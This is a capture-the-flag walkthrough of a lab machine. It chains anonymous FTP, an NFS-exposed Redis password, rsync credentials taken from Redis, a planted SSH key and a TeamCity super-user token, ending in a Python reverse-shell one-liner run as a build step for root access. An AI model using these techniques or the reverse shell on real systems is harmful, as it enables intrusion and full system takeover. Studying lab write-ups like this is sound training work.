- I used the `anonymous` password to connect. 

- Inside those two directories, I found the following files.

```
services.txt                        N       38  Sat Feb  6 13:45:09 2021
data.txt                            N       48  Tue Feb  2 11:21:18 2021
business-req.txt                    N      190  Tue Feb  2 11:27:33 2021
``` 

- `services.txt` is a flag, `data.txt` is some useless text and `business-req.txt` ... I don't know if it's a hint or not.

```
We just wanted to remind you that weâ€™re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed. If you have any questions, please text or phone us.

#### PORT 6379 - REDIS

- The next thing that caught my attention the Redis database, as it doesn't require authentication by default. However, this one did require a password only authentication.

- I tried leaving hydra to bruteforce for a while but no success.

#### Port 2049 - NFS

- I noticed port 2049 open, and I checked if there are any NFS Shares avaible to be mounted on my host.

```
sudo showmount -e 10.10.169.137

Export list for 10.10.169.137:
/opt/conf *
```

```
mkdir temp

sudo mount -t nfs  10.10.169.137:/opt/conf temp/
```

```

```

- Alright. So we got access to some files. The first thing I did was to check redis. Inside that directory was the config file of the DB.

```
cat redis.conf | grep pass

# masterauth <master-password>
requirepass "{REDACTED}F"
```

- Nice. I couldn't find other useful information in the rest of the files.

#### Back to Redis - 6379

```
10.10.169.137:6379> AUTH {REDACTED}
OK
10.10.169.137:6379> INFO keyspace
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
10.10.169.137:6379> SELECT 0
OK
10.10.169.137:6379> KEYS *
1) "int"
2) "marketlist"
3) "tmp"
4) "internal flag"
5) "authlist"
```

- We can get any key with the `get` command. `get "internal flag"` will get us another flag.
- However, I wanted to take a look at the others.

- I couldn't use `GET` for `authlist` and `marketlist`, since they were another Key Type (can be seen with `TYPE <key>`).

- I managed to read them using `LRANGE authlist 0 -1` and `LRANGE marketlist 0 -1`.

- Authlist contained a base64 string four times, which, upon decoding, revealed the following info:

```
Authorization for rsync://rsync-connect@127.0.0.1 with password {REDACTED}v
```

#### PORT 873 - rsync

- I did some manual enumeration via netcat

```bash
nc -vn 10.10.169.137 873
Connection to 10.10.169.137 873 port [tcp/*] succeeded!
@RSYNCD: 31.0 # sent by server
@RSYNCD: 31.0 # sent by me
#list # send by me
files          	Necessary home interaction # sent by server
@RSYNCD: EXIT # sent by server ; connection terminated.
```

```bash
nc -vn 10.10.169.137 873
Connection to 10.10.169.137 873 port [tcp/*] succeeded!
@RSYNCD: 31.0
@RSYNCD: 31.0
files
@RSYNCD: AUTHREQD m6HAgJwMhK47KSKe+dqlDw
```

- Ok, so we need to authenticate to access the `files` share. I don't know how to do this via `nc`, so let's use the `rsync` command.

```bash
mkdir rsynced
rsync -av rsync://rsync-connect@10.10.169.137/files rsynced/
```

- This will sync the entire remote directory to in our directory called rsynced.

```bash
ls -ah
.              .config    .gnupg    Public                     user.txt
..             .dbus      .local    .rediscli_history          Videos
.bash_history  Desktop    .mozilla  .ssh                       .Xauthority
.bash_logout   .dmrc      Music     .sudo_as_admin_successful  .xscreensaver
.bashrc        Documents  Pictures  Templates                  .xsession-errors
.cache         Downloads  .profile  .thumbnails                .xsession-errors.old
```

- The user flag is in `user.txt`. 

- Anyway. The files above have the structure of an usual home directory, and they're in a directory called `sys-internal.` This might be a valid username.

- What I did was to generate a ssh private:public key pair and write the public key in a file called `authorized_keys`. 

- Then, I've used rsync to upload it to `/files/sys-internal/.ssh`.

```
rsync -av authorized_keys rsync://rsync-connect@10.10.169.137/files/sys-internal/.ssh
```

- After this, all I had to do was to SSH to the box: `ssh -i internal_key sys-internal@10.10.169.137`

#### PRIVILEGE ESCALATION

- I didn't find anything manually, so I had to use one of those ... automated tools :|

- Anyway, I've transferred `linpeas.sh` using rsync and from the output I noticed that there was `/TeamCity` directory available. 

- Then, I googled and it uses port 8111. So I've used `ss --listening | grep 8111` and it was listening, so I've used SSH to port forward the website.

```
ssh -L 8111:127.0.0.1:8111 -i internal_key sys-internal@10.10.169.137
```

- Then, I headed to `http://127.0.0.1:8111` and clicked on `Log in as Super user`.

- This asked for an authentication code. 

```
cd /TeamCity

grep -r "token" */*
```

```
logs/catalina.out:[TeamCity] Super user authentication token: {REDACTED} (use empty username with the token as the password to access the server)
```

- Alright. I think I spend at least 1 hour poking around TeamCity, since I've never used it before. 

- Here's the thing: Teamcity is in root directory and it's owned (and ran) by root. Anything ran by TeamCity is ran as root.

- So here are the steps to get a reverse shell as root.

1. Create a new project.
2. Create a new... task ( i think ) under the project.
3. On the left column, go to Build Step. 
4. Add a new Build Step (python).
5. For the command, select "Custom script"
6. Here, I took the following reverse shell from revshells.com

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",3131));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- and I deleted the bash-related code, so I left only

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",3131));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

7. Save.
8. Go to Projects (top menu)
9. Click run.
10. Got a reverse shell.

- Last flag is in `/root/root.txt`.
